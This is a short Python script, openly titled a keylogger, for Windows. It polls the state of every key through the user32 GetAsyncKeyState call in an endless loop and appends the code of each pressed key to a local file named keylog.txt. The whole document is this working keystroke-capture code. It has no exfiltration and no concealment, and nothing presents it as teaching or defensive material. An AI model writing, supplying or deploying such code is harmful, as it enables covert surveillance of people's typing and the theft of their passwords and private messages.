#SIMPLE KEYLOGGER
import ctypes
import time

log_file = "keylog.txt"

def get_keystrokes():
    user32 = ctypes.WinDLL('user32')
    while True:
        for i in range(0, 256):
            if user32.GetAsyncKeyState(i) & 0x8000:
                with open(log_file, "a") as file:
                    file.write(f"{i} ")
        time.sleep(0.1)

if __name__ == "__main__":
    print("Keylogger started. Press 'Ctrl+C' to stop.")
    get_keystrokes()
